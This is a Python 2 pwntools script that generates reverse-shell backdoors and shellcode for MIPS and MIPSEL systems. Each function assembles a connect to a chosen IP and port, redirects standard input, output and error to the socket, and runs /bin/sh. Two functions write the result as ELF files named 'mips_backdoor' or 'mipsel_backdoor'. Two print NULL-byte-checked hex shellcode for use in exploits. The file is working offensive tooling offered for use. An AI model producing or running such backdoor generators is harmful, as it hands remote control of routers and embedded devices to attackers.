from pwn import *
import extract_shellcode


def generate_mipsel_backdoor(reverse_ip,reverse_port,filename):
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	move $a0,$s0
	nor $a1,$zero,-1
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	ELF_data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	ELF_data=make_elf(ELF_data_shellcode)
	if filename==None:
		filename="mipsel_backdoor"
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		print "mipsel_backdoor is ok in ./"
	else:
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		#print disasm(all_reverseshell)
		print "{} is ok in ./"


def generate_mips_backdoor(reverse_ip,reverse_port,filename):
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	nor $a1,$zero,-1
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	ELF_data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	ELF_data=make_elf(ELF_data_shellcode)
	if filename==None:
		filename="mips_backdoor"
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		print "mips_backdoor is ok in ./"
	else:
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		#print disasm(all_reverseshell)
		print "{} is ok in ./"
	os.system("chmod +x %s"%(filename))


def generate_mipsel_shellcode(reverse_ip,reverse_port):
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	sub $a1,$a0,9
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	shellcode_len=len(data_shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(data_shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		print shellcode_hex
	else:
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print shellcode_hex

def generate_mips_shellcode(reverse_ip,reverse_port):
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	sub $a1,$a0,9
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	shellcode_len=len(data_shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(data_shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		print shellcode_hex
	else:
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print shellcode_hex
